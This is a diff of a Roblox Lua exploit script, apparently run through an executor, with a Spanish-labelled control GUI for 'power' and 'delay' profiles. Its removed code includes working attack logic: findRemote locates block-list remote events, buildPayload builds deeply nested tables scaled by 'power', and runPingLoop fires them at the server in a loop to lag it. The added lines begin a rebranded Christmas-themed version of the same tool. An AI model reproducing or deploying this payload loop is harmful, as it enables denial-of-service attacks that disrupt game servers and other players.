-    led.BorderSizePixel = 0
-    led.ZIndex = 26
-    Instance.new("UICorner", led).CornerRadius = UDim.new(1,0)
-    return led
-end
-primaryLed = makePowerLed(activePowerButton)
-backupLed = makePowerLed(backupPowerButton)
-activePowerButton.MouseButton1Click:Connect(function()
-    cfg.activePower = 1
-    refreshPowerProfile()
-    updateToggleButton()
-    saveConfig()
-end)
-backupPowerButton.MouseButton1Click:Connect(function()
-    cfg.activePower = 2
-    refreshPowerProfile()
-    updateToggleButton()
-    saveConfig()
-end)
-refreshPowerProfile()
-
--- Perfil visual V1/V2/V3 integrado en la pestaña POWER.
--- La selección de estas tarjetas solo cambia el perfil mostrado; no conecta nuevos
--- perfiles al bucle de envío de cargas del script.
-local legacyRows = {powerBox.Parent, delayBox1.Parent, backupPowerBox.Parent, delayBox2.Parent}
-for _, row in ipairs(legacyRows) do row.Visible = false end
-profileRow.Visible = false
-
-local profileValues = {
-    V1 = {power = "100000", delay = "0.111"},
-    V2 = {power = "97200", delay = "0.12"},
-}
-local shownProfile = (type(savedUi.selectedPingProfile) == "string" and savedUi.selectedPingProfile == "V2") and savedUi.selectedPingProfile or "V1"
-local profileCards = {}
-local cardsHolder = Instance.new("Frame", powerPage)
-cardsHolder.Name = "VersionCards"
-cardsHolder.Size = UDim2.new(1, 0, 0, 125)
-cardsHolder.Position = UDim2.new(0, 0, 0, 2)
-cardsHolder.BackgroundTransparency = 1
-cardsHolder.ZIndex = 22
-
-local function makeProfileCard(name, index)
-    local card = Instance.new("Frame", cardsHolder)
-    card.Name = name .. "Card"
-    card.Size = UDim2.new(1/3, -4, 1, 0)
-    card.Position = UDim2.new((index-1)/3, (index-1)*2, 0, 0)
-    card.BackgroundColor3 = rowBg0
-    card.BackgroundTransparency = 0.18
-    card.BorderSizePixel = 0
-    card.ZIndex = 22
-    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 5)
-    local outline = Instance.new("UIStroke", card)
-    outline.Name = "ProfileOutline"
-    outline.Color = name == shownProfile and getStroke() or getAccent()
-    outline.Thickness = name == shownProfile and 1.5 or 0.7
-    outline.Transparency = name == shownProfile and 0.05 or 0.55
-
-    local title = Instance.new("TextLabel", card)
-    title.Size = UDim2.new(1, -4, 0, 18)
-    title.Position = UDim2.new(0, 2, 0, 3)
-    title.BackgroundTransparency = 1
-    title.Text = name
-    title.TextColor3 = getText()
-    title.Font = Enum.Font.GothamBlack
-    title.TextSize = 10
-    title.ZIndex = 23
-
-    local powerTitle = Instance.new("TextLabel", card)
-    powerTitle.Size = UDim2.new(1, -6, 0, 13)
-    powerTitle.Position = UDim2.new(0, 3, 0, 25)
-    powerTitle.BackgroundTransparency = 1
-    powerTitle.Text = "POWER"
-    powerTitle.TextColor3 = getText()
-    powerTitle.Font = Enum.Font.GothamBold
-    powerTitle.TextSize = 8
-    powerTitle.TextXAlignment = Enum.TextXAlignment.Left
-    powerTitle.ZIndex = 23
-
-    local powerValue = Instance.new("TextLabel", card)
-    powerValue.Size = UDim2.new(1, -6, 0, 24)
-    powerValue.Position = UDim2.new(0, 3, 0, 39)
-    powerValue.BackgroundColor3 = rowBoxBg0
-    powerValue.BorderSizePixel = 0
-    powerValue.Text = profileValues[name].power
-    powerValue.TextColor3 = stroke0
-    powerValue.Font = Enum.Font.GothamBlack
-    powerValue.TextSize = 10
-    powerValue.ZIndex = 23
-    Instance.new("UICorner", powerValue).CornerRadius = UDim.new(0, 4)
-
-    local delayTitle = Instance.new("TextLabel", card)
-    delayTitle.Size = UDim2.new(1, -6, 0, 13)
-    delayTitle.Position = UDim2.new(0, 3, 0, 67)
-    delayTitle.BackgroundTransparency = 1
-    delayTitle.Text = "DELAY"
-    delayTitle.TextColor3 = getText()
-    delayTitle.Font = Enum.Font.GothamBold
-    delayTitle.TextSize = 8
-    delayTitle.TextXAlignment = Enum.TextXAlignment.Left
-    delayTitle.ZIndex = 23
-
-    local delayValue = Instance.new("TextLabel", card)
-    delayValue.Size = UDim2.new(1, -6, 0, 24)
-    delayValue.Position = UDim2.new(0, 3, 0, 81)
-    delayValue.BackgroundColor3 = rowBoxBg0
-    delayValue.BorderSizePixel = 0
-    delayValue.Text = profileValues[name].delay
-    delayValue.TextColor3 = stroke0
-    delayValue.Font = Enum.Font.GothamBlack
-    delayValue.TextSize = 10
-    delayValue.ZIndex = 23
-    Instance.new("UICorner", delayValue).CornerRadius = UDim.new(0, 4)
-
-    local selectBtn = Instance.new("TextButton", card)
-    selectBtn.Name = "SelectButton"
-    selectBtn.Size = UDim2.new(1, -6, 0, 17)
-    selectBtn.Position = UDim2.new(0, 3, 1, -21)
-    selectBtn.BackgroundColor3 = name == shownProfile and getAccent() or rowBoxBg0
-    selectBtn.BorderSizePixel = 0
-    selectBtn.Text = name == shownProfile and "✓" or "SELECT"
-    selectBtn.TextColor3 = name == shownProfile and Color3.fromRGB(0,0,0) or getText()
-    selectBtn.Font = Enum.Font.GothamBlack
-    selectBtn.TextSize = 8
-    selectBtn.ZIndex = 24
-    Instance.new("UICorner", selectBtn).CornerRadius = UDim.new(0, 4)
-
-    profileCards[name] = {card=card, outline=outline, button=selectBtn}
-end
-
--- Sistema de perfiles V1/V2 con expansión por flecha
--- Por defecto solo se ve V1; al pulsar → se revela V2 y al pulsar ← vuelve a V1
-local expandedProfile = false -- false = solo V1, true = V1+V2
-
--- Ajustar tamaño del cardsHolder para un solo perfil visible inicialmente
-cardsHolder.Size = UDim2.new(1, 0, 0, 125)
-
-makeProfileCard("V1", 1)
-makeProfileCard("V2", 2)
-
--- Ocultar V2 inicialmente y re-posicionar V1 para que ocupe todo el ancho
-do
-    local v1card = profileCards["V1"] and profileCards["V1"].card
-    local v2card = profileCards["V2"] and profileCards["V2"].card
-    if v1card then
-        v1card.Size = UDim2.new(1, -28, 1, 0) -- deja espacio para la flecha
-        v1card.Position = UDim2.new(0, 0, 0, 0)
-    end
-    if v2card then v2card.Visible = false end
-end
-
--- Botón flecha para expandir/contraer V2
-local arrowBtn = Instance.new("TextButton", cardsHolder)
-arrowBtn.Name = "ProfileArrow"
-arrowBtn.Size = UDim2.new(0, 22, 0, 22)
-arrowBtn.Position = UDim2.new(1, -24, 0.5, -11)
-arrowBtn.BackgroundColor3 = rowBoxBg0
-arrowBtn.BorderSizePixel = 0
-arrowBtn.Text = "›"
-arrowBtn.TextColor3 = Color3.fromRGB(255,255,255)
-arrowBtn.Font = Enum.Font.GothamBlack
-arrowBtn.TextSize = 16
-arrowBtn.AutoButtonColor = false
-arrowBtn.ZIndex = 25
-Instance.new("UICorner", arrowBtn).CornerRadius = UDim.new(0, 6)
-addStroke(arrowBtn, 1, 0.3)
-
-local versionStatus = Instance.new("TextLabel", powerPage)
-versionStatus.Name = "VersionStatus"
-versionStatus.Size = UDim2.new(1, 0, 0, 23)
-versionStatus.Position = UDim2.new(0, 0, 0, 133)
-versionStatus.BackgroundColor3 = rowBg0
-versionStatus.BackgroundTransparency = 0.2
-versionStatus.BorderSizePixel = 0
-versionStatus.Text = "PERFIL SELECCIONADO: V1"
-versionStatus.TextColor3 = getText()
-versionStatus.Font = Enum.Font.GothamBlack
-versionStatus.TextSize = 9
-versionStatus.ZIndex = 22
-Instance.new("UICorner", versionStatus).CornerRadius = UDim.new(0, 5)
-
-local function selectVisualProfile(name)
-    shownProfile = name
-    savedUi.selectedPingProfile = name
-    versionStatus.Text = "PERFIL SELECCIONADO: " .. name
-    for version, item in pairs(profileCards) do
-        local chosen = version == name
-        item.outline.Color = chosen and getStroke() or getAccent()
-        item.outline.Thickness = chosen and 1.5 or 0.7
-        item.outline.Transparency = chosen and 0.05 or 0.55
-        item.button.BackgroundColor3 = chosen and getAccent() or rowBoxBg0
-        item.button.TextColor3 = chosen and Color3.fromRGB(0,0,0) or getText()
-        item.button.Text = chosen and "✓" or "SELECT"
-    end
-end
-
-arrowBtn.MouseButton1Click:Connect(function()
-    expandedProfile = not expandedProfile
-    local v1card = profileCards["V1"] and profileCards["V1"].card
-    local v2card = profileCards["V2"] and profileCards["V2"].card
-    if expandedProfile then
-        -- Mostrar V1 y V2
-        arrowBtn.Text = "‹"
-        if v1card then
-            v1card.Size = UDim2.new(0.5, -4, 1, 0)
-            v1card.Position = UDim2.new(0, 0, 0, 0)
-        end
-        if v2card then
-            v2card.Size = UDim2.new(0.5, -4, 1, 0)
-            v2card.Position = UDim2.new(0.5, 2, 0, 0)
-            v2card.Visible = true
-        end
-    else
-        -- Solo V1
-        arrowBtn.Text = "›"
-        if v1card then
-            v1card.Size = UDim2.new(1, -28, 1, 0)
-            v1card.Position = UDim2.new(0, 0, 0, 0)
-        end
-        if v2card then v2card.Visible = false end
-    end
-end)
-
-for version, item in pairs(profileCards) do
-    item.button.MouseButton1Click:Connect(function()
-        selectVisualProfile(version)
-        saveConfig()
-    end)
-    item.card.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1
-            or input.UserInputType == Enum.UserInputType.Touch then
-            selectVisualProfile(version)
-            saveConfig()
-        end
-    end)
-end
-selectVisualProfile(shownProfile)
-
-local autoBrainrotBtn, brainrotKnob
-do
-    local row = Instance.new("Frame", settingsPage)
-    row.Size = UDim2.new(1,0,0,25)
-    row.Position = UDim2.new(0,0,0,2)
-    row.BackgroundColor3 = rowBg0
-    row.BackgroundTransparency = 0.3
-    row.BorderSizePixel = 0
-    row.ZIndex = 22
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
-    local lbl = Instance.new("TextLabel", row)
-    lbl.Size = UDim2.new(0.6,0,1,0)
-    lbl.Position = UDim2.new(0,8,0,0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = "AUTO BRAINROT"
-    lbl.TextColor3 = text0
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 9
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.ZIndex = 23
-    autoBrainrotBtn = Instance.new("TextButton", row)
-    autoBrainrotBtn.Size = UDim2.new(0,38,0,18)
-    autoBrainrotBtn.Position = UDim2.new(1,-46,0.5,-9)
-    autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
-    autoBrainrotBtn.BorderSizePixel = 0
-    autoBrainrotBtn.Text = ""
-    autoBrainrotBtn.AutoButtonColor = false
-    autoBrainrotBtn.ZIndex = 24
-    Instance.new("UICorner", autoBrainrotBtn).CornerRadius = UDim.new(1, 0)
-    brainrotKnob = Instance.new("Frame", autoBrainrotBtn)
-    brainrotKnob.Size = UDim2.new(0,14,0,14)
-    brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
-    brainrotKnob.BackgroundColor3 = TOGGLE_KNOB
-    brainrotKnob.BorderSizePixel = 0
-    brainrotKnob.ZIndex = 26
-    Instance.new("UICorner", brainrotKnob).CornerRadius = UDim.new(1, 0)
-    local knobStroke = Instance.new("UIStroke", brainrotKnob)
-    knobStroke.Color = Color3.fromRGB(180,180,180)
-    knobStroke.Thickness = 1
-    autoBrainrotBtn.MouseButton1Click:Connect(function()
-        cfg.autoBrainrot = not cfg.autoBrainrot
-        if cfg.autoBrainrot then
-            tw(autoBrainrotBtn, {BackgroundColor3 = GREEN}, 0.15)
-            tw(brainrotKnob, {Position = UDim2.new(1,-16,0.5,-7)}, 0.15)
-        else
-            tw(autoBrainrotBtn, {BackgroundColor3 = TOGGLE_OFF}, 0.15)
-            tw(brainrotKnob, {Position = UDim2.new(0,2,0.5,-7)}, 0.15)
-            if active then flipLag(false, false) end
-        end
-        saveConfig()
-    end)
-end
-
-local keybindKbRow, keybindGpRow
-do
-    local row = Instance.new("Frame", settingsPage)
-    row.Size = UDim2.new(1,0,0,25)
-    row.Position = UDim2.new(0,0,0,31)
-    row.BackgroundColor3 = rowBg0
-    row.BackgroundTransparency = 0.3
-    row.BorderSizePixel = 0
-    row.ZIndex = 22
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
-    local lbl = Instance.new("TextLabel", row)
-    lbl.Size = UDim2.new(0.4,0,1,0)
-    lbl.Position = UDim2.new(0,8,0,0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = "KEYBOARD"
-    lbl.TextColor3 = text0
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 9
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.ZIndex = 23
-    keybindKbRow = Instance.new("TextButton", row)
-    keybindKbRow.Size = UDim2.new(0,84,0,18)
-    keybindKbRow.Position = UDim2.new(1,-92,0.5,-9)
-    keybindKbRow.BackgroundColor3 = rowBoxBg0
-    keybindKbRow.BackgroundTransparency = 0.25
-    keybindKbRow.BorderSizePixel = 0
-    keybindKbRow.Text = cfg.keybindKb
-    keybindKbRow.TextColor3 = stroke0
-    keybindKbRow.Font = Enum.Font.GothamBold
-    keybindKbRow.TextSize = 9
-    keybindKbRow.ZIndex = 24
-    Instance.new("UICorner", keybindKbRow).CornerRadius = UDim.new(0, 4)
-    addStroke(keybindKbRow, 1, 0.3)
-    keybindKbRow.MouseButton1Click:Connect(function()
-        listeningFor = (listeningFor == "kb") and nil or "kb"
-        keybindKbRow.Text = listeningFor == "kb" and "[?]" or cfg.keybindKb
-    end)
-
-    local row2 = Instance.new("Frame", settingsPage)
-    row2.Size = UDim2.new(1,0,0,25)
-    row2.Position = UDim2.new(0,0,0,60)
-    row2.BackgroundColor3 = rowBg0
-    row2.BackgroundTransparency = 0.3
-    row2.BorderSizePixel = 0
-    row2.ZIndex = 22
-    Instance.new("UICorner", row2).CornerRadius = UDim.new(0, 5)
-    local lbl2 = Instance.new("TextLabel", row2)
-    lbl2.Size = UDim2.new(0.4,0,1,0)
-    lbl2.Position = UDim2.new(0,8,0,0)
-    lbl2.BackgroundTransparency = 1
-    lbl2.Text = "CONTROLLER"
-    lbl2.TextColor3 = text0
-    lbl2.Font = Enum.Font.GothamBold
-    lbl2.TextSize = 9
-    lbl2.TextXAlignment = Enum.TextXAlignment.Left
-    lbl2.ZIndex = 23
-    keybindGpRow = Instance.new("TextButton", row2)
-    keybindGpRow.Size = UDim2.new(0,84,0,18)
-    keybindGpRow.Position = UDim2.new(1,-92,0.5,-9)
-    keybindGpRow.BackgroundColor3 = rowBoxBg0
-    keybindGpRow.BackgroundTransparency = 0.25
-    keybindGpRow.BorderSizePixel = 0
-    keybindGpRow.Text = cfg.keybindGp
-    keybindGpRow.TextColor3 = stroke0
-    keybindGpRow.Font = Enum.Font.GothamBold
-    keybindGpRow.TextSize = 9
-    keybindGpRow.ZIndex = 24
-    Instance.new("UICorner", keybindGpRow).CornerRadius = UDim.new(0, 4)
-    addStroke(keybindGpRow, 1, 0.3)
-    keybindGpRow.MouseButton1Click:Connect(function()
-        listeningFor = (listeningFor == "gp") and nil or "gp"
-        keybindGpRow.Text = listeningFor == "gp" and "[?]" or cfg.keybindGp
-    end)
-end
-
-local bgRow
-do
-    local row = Instance.new("Frame", configPage)
-    row.Size = UDim2.new(1,0,0,25)
-    row.Position = UDim2.new(0,0,0,89)
-    row.BackgroundColor3 = rowBg0
-    row.BackgroundTransparency = 0.3
-    row.BorderSizePixel = 0
-    row.ZIndex = 22
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
-    local lbl = Instance.new("TextLabel", row)
-    lbl.Size = UDim2.new(0.4,0,1,0)
-    lbl.Position = UDim2.new(0,8,0,0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = "FONDO"
-    lbl.TextColor3 = text0
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 9
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.ZIndex = 23
-    bgRow = Instance.new("TextButton", row)
-    bgRow.Size = UDim2.new(0,58,0,18)
-    bgRow.Position = UDim2.new(1,-80,0.5,-9)
-    bgRow.BackgroundColor3 = rowBoxBg0
-    bgRow.BackgroundTransparency = 0.25
-    bgRow.BorderSizePixel = 0
-    bgRow.Text = getBgName()
-    bgRow.TextColor3 = stroke0
-    bgRow.Font = Enum.Font.GothamBold
-    bgRow.TextSize = 9
-    bgRow.ZIndex = 24
-    Instance.new("UICorner", bgRow).CornerRadius = UDim.new(0, 4)
-    addStroke(bgRow, 1, 0.3)
-    local function cycleBackground(delta)
-        bgIndex = ((bgIndex - 1 + delta) % #BG_LIST) + 1
-        local newId = getBgId()
-        mainBgImage.Image = newId
-        settingsBgImage.Image = newId
-        bgRow.Text = getBgName()
-        applyAccentColors()
-        updateToggleButton()
-    end
-    local bgLeft = Instance.new("TextButton", row)
-    bgLeft.Name = "backgroundArrowLeft"
-    bgLeft.Size = UDim2.new(0,16,0,18)
-    bgLeft.Position = UDim2.new(1,-101,0.5,-9)
-    bgLeft.BackgroundColor3 = rowBoxBg0
-    bgLeft.BorderSizePixel = 0
-    bgLeft.Text = "<"
-    bgLeft.TextColor3 = stroke0
-    bgLeft.Font = Enum.Font.GothamBlack
-    bgLeft.TextSize = 10
-    bgLeft.AutoButtonColor = false
-    bgLeft.ZIndex = 24
-    Instance.new("UICorner", bgLeft).CornerRadius = UDim.new(1,0)
-    addStroke(bgLeft, 1, 0.3)
-    local bgRight = bgLeft:Clone()
-    bgRight.Name = "backgroundArrowRight"
-    bgRight.Position = UDim2.new(1,-20,0.5,-9)
-    bgRight.Text = ">"
-    bgRight.Parent = row
-    bgLeft.MouseButton1Click:Connect(function() cycleBackground(-1) end)
-    bgRight.MouseButton1Click:Connect(function() cycleBackground(1) end)
-    bgRow.MouseButton1Click:Connect(function() cycleBackground(1) end)
-end
-
-local borderRow = Instance.new("Frame", configPage)
-borderRow.Name = "BorderColorRow"
-borderRow.Size = UDim2.new(1,0,0,25)
-borderRow.Position = UDim2.new(0,0,0,118)
-borderRow.BackgroundColor3 = rowBg0
-borderRow.BackgroundTransparency = 0.3
-borderRow.BorderSizePixel = 0
-borderRow.ZIndex = 22
-Instance.new("UICorner", borderRow).CornerRadius = UDim.new(0, 5)
-local borderLbl = Instance.new("TextLabel", borderRow)
-borderLbl.Size = UDim2.new(0,62,1,0)
-borderLbl.Position = UDim2.new(0,8,0,0)
-borderLbl.BackgroundTransparency = 1
-borderLbl.Text = "BORDE"
-borderLbl.TextColor3 = text0
-borderLbl.Font = Enum.Font.GothamBold
-borderLbl.TextSize = 9
-borderLbl.TextXAlignment = Enum.TextXAlignment.Left
-borderLbl.ZIndex = 23
-local colorLeft = Instance.new("TextButton", borderRow)
-colorLeft.Name = "colorArrowLeft"
-colorLeft.Size = UDim2.new(0,16,0,18)
-colorLeft.Position = UDim2.new(0,67,0.5,-9)
-colorLeft.BackgroundColor3 = rowBoxBg0
-colorLeft.BorderSizePixel = 0
-colorLeft.Text = "<"
-colorLeft.TextColor3 = stroke0
-colorLeft.Font = Enum.Font.GothamBlack
-colorLeft.TextSize = 10
-colorLeft.AutoButtonColor = false
-colorLeft.ZIndex = 24
-Instance.new("UICorner", colorLeft).CornerRadius = UDim.new(1,0)
-addStroke(colorLeft, 1, 0.3)
-local colorRight = colorLeft:Clone()
-colorRight.Name = "colorArrowRight"
-colorRight.Position = UDim2.new(1,-23,0.5,-9)
-colorRight.Text = ">"
-colorRight.Parent = borderRow
-local colorDots = Instance.new("Frame", borderRow)
-colorDots.Name = "ColorDots"
-colorDots.Size = UDim2.new(0,94,0,18)
-colorDots.Position = UDim2.new(0,86,0.5,-9)
-colorDots.ClipsDescendants = true
-colorDots.BackgroundTransparency = 1
-colorDots.ZIndex = 24
-local colorDotLayout = Instance.new("UIListLayout", colorDots)
-colorDotLayout.FillDirection = Enum.FillDirection.Horizontal
-colorDotLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-colorDotLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-colorDotLayout.Padding = UDim.new(0,1)
-local colorDotList = {}
-local colorWindowStart = 1
-local function updateColorDots()
-    colorWindowStart = math.max(1, math.min(colorIndex - 3, #COLOR_OPTIONS - 6))
-    for i, dot in ipairs(colorDotList) do
-        local visible = i >= colorWindowStart and i < colorWindowStart + 7
-        dot.Visible = visible
-        local st = dot:FindFirstChild("DotStroke")
-        if st then st.Thickness = (customStroke and i == colorIndex) and 2 or 1 end
-        dot.BackgroundTransparency = (customStroke and i == colorIndex) and 0 or 0.15
-    end
-end
-local function chooseBorderColor(index)
-    colorIndex = ((index - 1) % #COLOR_OPTIONS) + 1
-    customStroke = COLOR_OPTIONS[colorIndex]
-    updateColorDots()
-    applyAccentColors()
-end
-for i, color in ipairs(COLOR_OPTIONS) do
-    local dot = Instance.new("TextButton", colorDots)
-    dot.Name = "colorDot" .. i
-    dot.Size = UDim2.new(0,10,0,10)
-    dot.BackgroundColor3 = color
-    dot.BorderSizePixel = 0
-    dot.Text = ""
-    dot.AutoButtonColor = false
-    dot.ZIndex = 25
-    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
-    local ds = Instance.new("UIStroke", dot)
-    ds.Name = "DotStroke"
-    ds.Color = Color3.fromRGB(255,255,255)
-    ds.Thickness = 1
-    ds.Transparency = 0.1
-    table.insert(colorDotList, dot)
-    dot.MouseButton1Click:Connect(function() chooseBorderColor(i) end)
-end
-colorLeft.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex - 1) end)
-colorRight.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex + 1) end)
-updateColorDots()
-
-local resetBtn = Instance.new("TextButton", configPage)
-resetBtn.Size = UDim2.new(1,0,0,22)
-resetBtn.Position = UDim2.new(0,0,0,148)
-resetBtn.BackgroundColor3 = rowBg0
-resetBtn.BackgroundTransparency = 0.3
-resetBtn.BorderSizePixel = 0
-resetBtn.AutoButtonColor = false
-resetBtn.Text = "RESET DEFAULTS"
-resetBtn.TextColor3 = text0
-resetBtn.Font = Enum.Font.GothamBold
-resetBtn.TextSize = 9
-resetBtn.ZIndex = 22
-Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 5)
-local resetStroke = Instance.new("UIStroke", resetBtn)
-resetStroke.Color = stroke0
-resetStroke.Thickness = 1
-resetStroke.Transparency = 0.3
-resetBtn.MouseButton1Click:Connect(function()
-    cfg.power1 = DEFAULT_CFG.power1
-    cfg.power2 = DEFAULT_CFG.power2
-    cfg.interval1 = DEFAULT_CFG.interval1
-    cfg.interval2 = DEFAULT_CFG.interval2
-    cfg.activePower = DEFAULT_CFG.activePower
-    cfg.power = cfg.power1
-    cfg.interval = cfg.interval1
-    cfg.keybindKb = DEFAULT_CFG.keybindKb
-    cfg.keybindGp = DEFAULT_CFG.keybindGp
-    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
-    customStroke = nil
-    colorIndex = 1
-    updateColorDots()
-    refreshPowerProfile()
-    keybindKbRow.Text = cfg.keybindKb
-    keybindGpRow.Text = cfg.keybindGp
-    if autoBrainrotBtn then
-        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
-        brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
-    end
-    saveConfig()
-end)
-
-local function findRemote()
-    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
-    if not rrs then return nil end
-    local found = nil
-    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
-        local r = rrs:FindFirstChild(name)
-        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
-            found = r
-            break
+    local function saveConfig()
+        local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+        if ok and encoded and writefile then
+            pcall(writefile, CONFIG_FILE, encoded)
         end
     end
-    if not found then
-        for _, c in ipairs(rrs:GetChildren()) do
-            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
-                found = c
-                break
-            end
+
+    local function loadConfig()
+        if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+        local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+        if not ok or type(data) ~= "table" then return end
+
+        cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
+        cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
+        cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+        cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+        cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
+        cfg.mode          = type(data.mode) == "string" and MODES[data.mode] and data.mode or DEFAULT_CFG.mode
+
+        local m = MODES[cfg.mode]
+        if m then
+            cfg.power    = m.power
+            cfg.interval = m.interval
         end
     end
-    return found
-end
 
-remote = findRemote()
+    loadConfig()
 
-local function buildPayload(power)
-    local safePower = tonumber(power) or DEFAULT_CFG.power
-    if safePower < 1 then safePower = 1 end
-    local main = {}
-    local nested = {{}}
-    local current = nested[1]
-    for _ = 1, 186 do
-        local n = {}
-        table.insert(current, n)
-        current = n
-    end
-    local maxRep = math.min(math.floor(safePower / 188), 10000)
-    if maxRep < 1 then maxRep = 1 end
-    for _ = 1, maxRep do
-        table.insert(main, nested)
-    end
-    return main
-end
+    local active            = false
+    local listeningFor      = nil
+    local remote            = nil
+    local brainrotMode      = false
+    local lastBrainrotState = false
+    local manualOverride    = false
 
-local function runPingLoop()
-    if not active or not remote then
-        pingLoopRunning = false
-        return
+    -- ══════════════════════════════════════════════════════════════════════
+    -- COLOURS (transparente, igual que el MVP)
+    -- ══════════════════════════════════════════════════════════════════════
+    local C = {
+        -- Christmas palette: deep reds + forest greens + gold accents
+        bg      = Color3.fromRGB(28, 12, 14),
+        panel   = Color3.fromRGB(18, 42, 28),
+        card    = Color3.fromRGB(42, 16, 18),
+        gold1   = Color3.fromRGB(180, 28, 36),   -- christmas red
+        gold2   = Color3.fromRGB(22, 140, 58),   -- christmas green
+        gold3   = Color3.fromRGB(255, 220, 120), -- warm gold
+        glow    = Color3.fromRGB(255, 60, 70),   -- bright red glow
+        white   = Color3.fromRGB(255, 250, 245),
+        dim     = Color3.fromRGB(180, 200, 185),
+        green   = Color3.fromRGB(40, 200, 90),
+        yellow  = Color3.fromRGB(255, 215, 90),
+        red     = Color3.fromRGB(230, 45, 55),
+        waiting = Color3.fromRGB(255, 180, 80),
+        inputBg = Color3.fromRGB(20, 35, 25),
+        discord = Color3.fromRGB(120, 220, 140),
+    }
+    local T = {bg = 0.08, panel = 0.06, card = 0.10, header = 0.02, inputBg = 0.08}
+
+    local MODE_TEXT_COLORS = {
+        LOW  = Color3.fromRGB(60, 220, 100),
+        MED  = Color3.fromRGB(255, 210, 70),
+        HIGH = Color3.fromRGB(255, 70, 80),
+    }
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- DESTROY OLD GUI
+    -- ══════════════════════════════════════════════════════════════════════
+    for _, kid in pairs(plrGui:GetChildren()) do
+        if kid.Name == "LuckCrissmasPingGui" then kid:Destroy() end
     end
-    pingLoopRunning = true
-    local currentDelay = tonumber(cfg.interval) or DEFAULT_CFG.interval
-    while active and remote and pingLoopRunning do
-        local payload = buildPayload(cfg.power)
-        local ok = pcall(function()
-            if remote:IsA("RemoteFunction") then
-                remote:InvokeServer(payload)
-            else
-                remote:FireServer(payload)
+
+    local screen = Instance.new("ScreenGui")
+    screen.Name         = "LuckCrissmasPingGui"
+    screen.ResetOnSpawn = false
+    screen.DisplayOrder = 15
+    screen.Parent       = plrGui
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- HELPERS
+    -- ══════════════════════════════════════════════════════════════════════
+    local function applyGradient(parent, c1, c2, rotation)
+        local g = Instance.new("UIGradient", parent)
+        g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
+        g.Rotation = rotation or 135
+        return g
+    end
+
+    local function tw(obj, props, t)
+        TweenService:Create(obj,
+            TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            props):Play()
+    end
+
+    local function makeDraggable(frame)
+        local dragging, dragStart, startPos
+        frame.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1
+            or i.UserInputType == Enum.UserInputType.Touch then
+                dragging  = true
+                dragStart = i.Position
+                startPos  = frame.Position
+                i.Changed:Connect(function()
+                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
+                end)
             end
         end)
-        if not ok then
-            currentDelay = math.min(currentDelay * 1.5, 0.5)
-        else
-            currentDelay = math.max(currentDelay * 0.995, 0.05)
-        end
-        task.wait(currentDelay)
+        frame.InputChanged:Connect(function(i)
+            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+                          or i.UserInputType == Enum.UserInputType.Touch) then
+                local d = i.Position - dragStart
+                frame.Position = UDim2.new(
+                    startPos.X.Scale, startPos.X.Offset + d.X,
+                    startPos.Y.Scale, startPos.Y.Offset + d.Y)
+            end
+        end)
     end
-    pingLoopRunning = false
-end
 
-local function flipLag(state, isManual)
-    if not state and pingLoopRunning then
-        pingLoopRunning = false
+    local function isGamepad(kc)
+        local n = kc.Name
+        return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+            or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
     end
-    active = state
-    if isManual then
-        if brainrotMode then
-            manualOverride = not state
-        else
-            manualOverride = false
+
+    local BLACKLISTED = {
+        [Enum.KeyCode.Escape]      = true,
+        [Enum.KeyCode.LeftControl] = true,
+        [Enum.KeyCode.Unknown]     = true,
+    }
+
+
